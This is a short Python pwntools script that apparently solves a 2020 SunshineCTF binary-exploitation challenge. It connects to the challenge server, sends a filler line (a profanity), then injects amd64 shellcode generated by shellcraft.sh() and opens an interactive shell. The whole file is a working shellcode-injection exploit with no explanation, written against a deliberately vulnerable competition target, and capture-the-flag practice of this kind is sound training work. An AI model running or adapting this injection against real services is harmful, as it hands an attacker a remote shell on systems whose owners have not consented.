from pwn import *

context.arch = 'amd64'

sh = remote('chal.2020.sunshinectf.org', 30007)
# sh = process('./chall_07')

sh.sendline('fuck')

sh_code = asm(shellcraft.sh())
sh.sendline(sh_code)

sh.interactive()
